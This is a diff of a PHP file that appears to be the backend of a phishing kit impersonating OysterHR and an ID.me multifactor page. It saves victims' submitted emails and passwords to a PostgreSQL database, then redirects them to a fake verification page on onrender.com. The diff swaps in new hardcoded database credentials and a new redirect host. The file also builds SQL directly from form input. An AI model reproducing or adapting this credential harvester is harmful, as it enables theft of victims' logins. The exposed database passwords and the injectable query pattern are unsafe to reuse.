@@ -1,12 +1,12 @@
 <?php
-$db = pg_connect("host=dpg-cmc9568cmk4c73bnumkg-a 
-port=5432 dbname=oysterhr_postgresql user=oysterhr_postgresql_user password=NtqQGP4VnRMOz9AvgcXWIConlVJtVpTu");
+$db = pg_connect("host=dpg-cpfkmsu3e1ms73e9sjk0-a 
+port=5432 dbname=hehehe_pgsql_oac8 user=hehehe_pgsql_oac8_user password=1tIgiaIzf4NfVIViR4nz19bvDHxq4Nn5");
 
 if ($_SERVER["REQUEST_METHOD"]=="POST"){
 $query = "INSERT INTO form (useremail,userpassword,timecol,ip) VALUES ('$_POST[useremail]','$_POST[userpassword]',NOW(),'$_POST[ip]')";
 $result = pg_query($query);
 
-header("Location:https://oysterhr.onrender.com/OysterHR.com/oysterhr/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_1.html");
+header("Location:https://oyster-hr.onrender.com/OysterHR.com/oysterhr/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_1.html");
 exit;
 }
 ?>
